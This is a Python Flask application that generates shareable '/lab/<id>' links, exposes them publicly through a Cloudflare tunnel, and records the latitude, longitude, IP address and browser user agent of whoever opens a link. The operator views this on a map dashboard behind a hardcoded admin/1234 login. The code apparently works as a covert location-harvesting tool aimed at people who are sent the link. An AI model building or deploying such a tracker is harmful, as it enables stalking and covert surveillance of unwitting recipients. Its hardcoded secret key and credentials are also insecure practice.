from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import os
import re
import sqlite3, uuid
import subprocess
import threading
from datetime import datetime

app = Flask(__name__)
app.secret_key = "haider_secret_key"

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "root_login"

# Dummy admin user
class User(UserMixin):
    def __init__(self, id):
        self.id = id

@login_manager.user_loader
def load_user(user_id):
    return User(user_id)

# Init DB
def init_db():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id TEXT, lat TEXT, lon TEXT, ip TEXT, agent TEXT, time TEXT)''')
    conn.commit()
    conn.close()

init_db()

cloudflare_process = None
cloudflare_public_url = ""
cloudflare_status = "not_started"


def _cloudflare_output_reader(process):
    global cloudflare_public_url, cloudflare_status
    url_pattern = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")

    for line in process.stdout:
        match = url_pattern.search(line)
        if match:
            cloudflare_public_url = match.group(0)
            cloudflare_status = "running"

    if cloudflare_status != "running":
        cloudflare_status = "stopped"


def start_cloudflare_tunnel():
    global cloudflare_process, cloudflare_status

    # Skip if user provided a fixed public URL manually.
    if os.getenv("PUBLIC_BASE_URL", "").strip():
        cloudflare_status = "using_env_url"
        return

    if cloudflare_process and cloudflare_process.poll() is None:
        return

    try:
        cloudflare_status = "starting"
        cloudflare_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        reader_thread = threading.Thread(
            target=_cloudflare_output_reader,
            args=(cloudflare_process,),
            daemon=True
        )
        reader_thread.start()
    except FileNotFoundError:
        cloudflare_status = "missing_cloudflared"
    except Exception:
        cloudflare_status = "error"


def build_tracking_link(uid):
    public_base = os.getenv("PUBLIC_BASE_URL", "").strip()
    if public_base:
        return f"{public_base.rstrip('/')}/lab/{uid}"
    if cloudflare_public_url:
        return f"{cloudflare_public_url}/lab/{uid}"
    return request.host_url + "lab/" + uid

# LOGIN ON ROOT
@app.route('/', methods=['GET', 'POST'])
def root_login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username == "admin" and password == "1234":
            user = User(id=1)
            login_user(user)
            return redirect(url_for('dashboard'))
    return render_template("login.html")

# OPTIONAL LOGIN ALIAS
@app.route('/login', methods=['GET', 'POST'])
def login():
    return redirect(url_for('root_login'))

# GENERATE LINK WITH MAP
@app.route('/dashboard')
@login_required
def dashboard():
    uid = str(uuid.uuid4())[:8]
    full_link = build_tracking_link(uid)
    
    # Get location data for the map
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT * FROM locations ORDER BY time DESC")
    data = c.fetchall()
    conn.close()
    
    return render_template("index.html", link=full_link, data=data)

# TRACK PAGE
@app.route('/lab/<id>')
@app.route('/track/<id>')
def track(id):
    return render_template("track.html", id=id)

# SAVE LOCATION
@app.route('/save/<id>', methods=['POST'])
@app.route('/lab/save/<id>', methods=['POST'])
def save(id):
    data = request.get_json()
    lat = data['lat']
    lon = data['lon']

    ip = request.remote_addr
    agent = request.headers.get('User-Agent')
    time = datetime.now()

    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("INSERT INTO locations VALUES (?,?,?,?,?,?)",
              (id, lat, lon, ip, agent, time))
    conn.commit()
    conn.close()

    return {"status":"ok"}

# LIVE DATA API
@app.route('/api/data')
@login_required
def api_data():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT id, lat, lon, ip, agent, time FROM locations ORDER BY time DESC")
    data = c.fetchall()
    conn.close()
    return {"locations": data}


@app.route('/api/tunnel')
@login_required
def api_tunnel():
    return {
        "status": cloudflare_status,
        "public_url": cloudflare_public_url,
        "local_url": "http://localhost:5000"
    }

# LOGOUT
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('root_login'))

if __name__ == "__main__":
    start_cloudflare_tunnel()
    app.run(host="0.0.0.0", port=5000)